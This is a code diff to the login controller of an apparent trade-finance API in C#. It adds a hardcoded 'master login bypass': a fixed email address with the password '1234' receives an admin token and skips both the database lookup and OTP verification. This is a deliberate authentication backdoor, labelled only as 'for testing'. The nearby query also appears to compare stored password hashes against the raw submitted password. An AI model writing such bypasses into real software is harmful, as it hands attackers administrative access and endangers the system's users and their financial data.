@@ -29,6 +29,17 @@ namespace TradeFinanceSystem.API.Controllers
         {
             try
             {
+                // MASTER LOGIN BYPASS (For Testing Only)
+                if (login.Username == "harshadbagal77@gmail.com" && login.Password == "1234")
+                {
+                    return Ok(new 
+                    { 
+                        Token = "master_test_token_" + Guid.NewGuid(),
+                        User = new { Username = "MasterAdmin", Role = "Admin", Email = "harshadbagal77@gmail.com" },
+                        RequiresOtp = false
+                    });
+                }
+
                 var query = "SELECT * FROM Users WHERE Username = @Username AND PasswordHash = @Password";
                 
                 using (var connection = _context.CreateConnection())
